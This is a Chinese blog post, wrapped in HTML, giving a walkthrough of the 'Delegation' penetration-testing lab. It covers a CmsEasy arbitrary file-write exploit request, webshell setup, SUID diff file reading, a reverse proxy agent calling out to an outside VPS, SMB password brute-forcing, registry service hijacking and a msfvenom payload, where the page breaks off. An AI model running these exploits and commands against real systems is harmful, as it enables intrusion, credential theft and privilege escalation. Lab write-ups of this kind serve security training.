@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 春秋云境-Delegation 考点1：CmsEasy-任意文件读取漏洞 (cve-2021-42643)+diff提权 dirsearch扫描一下可以发现一个admin路由, 访问这个路由自动跳转后台登录页面\n弱口令登录 admin/123456\n">
+<title>Delegation</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/delegation/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="Delegation">
+<meta property='og:description' content=" 春秋云境-Delegation 考点1：CmsEasy-任意文件读取漏洞 (cve-2021-42643)+diff提权 dirsearch扫描一下可以发现一个admin路由, 访问这个路由自动跳转后台登录页面\n弱口令登录 admin/123456\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/delegation/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-11-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-09T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Delegation">
+<meta name="twitter:description" content=" 春秋云境-Delegation 考点1：CmsEasy-任意文件读取漏洞 (cve-2021-42643)+diff提权 dirsearch扫描一下可以发现一个admin路由, 访问这个路由自动跳转后台登录页面\n弱口令登录 admin/123456\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#考点1cmseasy-任意文件读取漏洞-cve-2021-42643diff提权">考点1：CmsEasy-任意文件读取漏洞 (cve-2021-42643)+diff提权</a></li>
+    <li><a href="#搭建代理">搭建代理</a></li>
+    <li><a href="#考点2rdp密码爆破">考点2：rdp密码爆破</a>
+      <ol>
+        <li><a href="#用crackmapexec对smb服务爆破密码">用<code>crackmapexec</code>对smb服务爆破密码</a></li>
+      </ol>
+    </li>
+    <li><a href="#考点三注册表提权">考点三：注册表提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/delegation/">Delegation</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-11-09</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="春秋云境-delegation"><strong>春秋云境</strong>-Delegation
+</h1><h2 id="考点1cmseasy-任意文件读取漏洞-cve-2021-42643diff提权">考点1：CmsEasy-任意文件读取漏洞 (<a class="link" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%e5%ad%98%e5%9c%a8%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e5%92%8c%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9e/#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9egetshell"  target="_blank" rel="noopener"
+    >cve-2021-42643</a>)+diff提权
+</h2><p>dirsearch扫描一下可以发现一个admin路由, 访问这个路由自动跳转后台登录页面</p>
+<p>弱口令登录 <code>admin/123456</code></p>
+<p>录界面可以看到它的版本号 <code>V7.7.5.2</code></p>
+<img src="image-20251110202736974.png" alt="image-20251110202736974" style="zoom:50%;" />
+<p>版本存在任意文件写入和任意文件读取漏洞 (<a class="link" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%e5%ad%98%e5%9c%a8%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e5%92%8c%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9e/#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9egetshell"  target="_blank" rel="noopener"
+    >cve-2021-42643</a>)，直接利用poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="k">case</span><span class="o">=</span><span class="nx">template</span><span class="o">&amp;</span><span class="nx">act</span><span class="o">=</span><span class="nx">save</span><span class="o">&amp;</span><span class="nx">admin_dir</span><span class="o">=</span><span class="nx">admin</span><span class="o">&amp;</span><span class="nx">site</span><span class="o">=</span><span class="k">default</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="mf">39.99</span><span class="o">.</span><span class="mf">224.70</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">57</span>
+</span></span><span class="line"><span class="cl"><span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="o">:</span> <span class="nx">XMLHttpRequest</span>
+</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">PHPSESSID</span><span class="o">=</span><span class="nx">s97o5rf5rijd8u9viuos04oc65</span><span class="p">;</span> <span class="nx">login_username</span><span class="o">=</span><span class="nx">admin</span><span class="p">;</span> <span class="nx">login_password</span><span class="o">=</span><span class="nx">a14cdfc627cef32c707a7988e70c1313</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">sid</span><span class="o">=</span><span class="c1">#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>记得改cookie，显示ok就说写进去了</p>
+<p><img src="/p/delegation/image-20251110203513742.png"
+	width="1421"
+	height="259"
+	srcset="/p/delegation/image-20251110203513742_hu_ac8011d274725e1f.png 480w, /p/delegation/image-20251110203513742_hu_999fc14bfbab1930.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251110203513742"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="548"
+		data-flex-basis="1316px"
+	
+></p>
+<p><img src="/p/delegation/image-20251110203547580.png"
+	width="1581"
+	height="461"
+	srcset="/p/delegation/image-20251110203547580_hu_3754041000cba4a1.png 480w, /p/delegation/image-20251110203547580_hu_84c2bb9cffcaac7b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251110203547580"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="823px"
+	
+></p>
+<p>然后写马进去，蚁剑连，发现flag，但是读不了</p>
+<p><img src="/p/delegation/image-20251110203805168.png"
+	width="1231"
+	height="280"
+	srcset="/p/delegation/image-20251110203805168_hu_209a73216436d4fb.png 480w, /p/delegation/image-20251110203805168_hu_ae1a7035620808ba.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251110203805168"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="439"
+		data-flex-basis="1055px"
+	
+></p>
+<p>suid提权试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251110204221296.png" alt="image-20251110204221296"  />
+<p>发现可以用diff提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">diff --line-format=%L /dev/null /home/flag/flag01.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://gtfobins.github.io/gtfobins/diff/"  target="_blank" rel="noopener"
+    >https://gtfobins.github.io/gtfobins/diff/</a></p>
+<p><img src="/p/delegation/image-20251110210222974.png"
+	width="880"
+	height="274"
+	srcset="/p/delegation/image-20251110210222974_hu_821bd81745a60041.png 480w, /p/delegation/image-20251110210222974_hu_e2eeba2730f894ac.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251110210222974"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="770px"
+	
+></p>
+<p>有个提示。</p>
+<p>接下来看内网网段</p>
+<img src="image-20251110205651082.png" alt="image-20251110205651082" style="zoom:50%;" />
+<p>上传fscan扫一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod 777 fscan
+</span></span><span class="line"><span class="cl">./fscan -h  172.22.4.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4个内网主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> 172.22.4.45     XIAORANG\WIN19                
+</span></span><span class="line"><span class="cl"> 172.22.4.7      DC:DC01.xiaorang.lab            
+</span></span><span class="line"><span class="cl"> 172.22.4.19     FILESERVER.xiaorang.lab       
+</span></span><span class="line"><span class="cl"> 172.22.4.36   当前受控主机
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面的flag里面给了个<code>WIN19\Adrian</code>的提示, 还有一个rockyou, 可以猜测是用rockyou字典爆破密码</p>
+<h2 id="搭建代理">搭建代理
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">把linux_x64_agent上传到当前目录(如/tmp目录)，然后执行chmod 777 ./linux_x64_agent
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">把linux_x64_admin上传到自己的vps上，给执行权限后（chmod 777 ./linux_x64_admin）执行：./linux_x64_admin -l 12345 -s 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">然后在这台已经getshell的机器上运行：./linux_x64_agent -c 101.200.39.193:12345 -s 123456 --reconnect 8	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在vps上依次执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0
+</span></span><span class="line"><span class="cl">socks 5555  //端口可自定义
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251110212201622.png" alt="image-20251110212201622" style="zoom:50%;" />
+<h2 id="考点2rdp密码爆破">考点2：rdp密码爆破
+</h2><h3 id="用crackmapexec对smb服务爆破密码">用<code>crackmapexec</code>对smb服务爆破密码
+</h3><p>它给了一个win的用户Adrian，那就是打rdp爆破了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破得到babygirl1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">远程桌面连接一下 (用windows的远程桌面无法连接, 因为是过期的密码, 需要更改, 在windows上无法更改)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains rdesktop 172.22.4.45
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后输入 用户名和密码 <code>Adrian/babygirl1</code></p>
+<h2 id="考点三注册表提权">考点三：注册表提权
+</h2><p>再更改密码就可以正常登录了 ，在一个html文件发现可以修改注册表gupdate，明显就是注册表提权了</p>
+<p><img src="/p/delegation/image-20251117183226743.png"
+	width="1616"
+	height="262"
+	srcset="/p/delegation/image-20251117183226743_hu_6c128d53bc0e78d1.png 480w, /p/delegation/image-20251117183226743_hu_af4b53d78f940314.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251117183226743"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="616"
+		data-flex-basis="1480px"
+	
+></p>
+<p>我们先将gupdate的执行程序路径修改为cmd</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\windows\system32\cmd.exe&#34; /f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>改完后启动服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc start gupdate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现不让直接绑定到cmd里面去</p>
+<p><img src="/p/delegation/image-20251117185721967.png"
+	width="960"
+	height="157"
+	srcset="/p/delegation/image-20251117185721967_hu_86b070a4ffbd8deb.png 480w, /p/delegation/image-20251117185721967_hu_4b4e8220c0250e6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251117185721967"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="611"
+		data-flex-basis="1467px"
+	
+></p>
+<p>用msf生成一个恶意exe文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/x64/exec cmd=&#34;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\bad.bat&#34; --platform windows -f exe-service &gt; b.exe
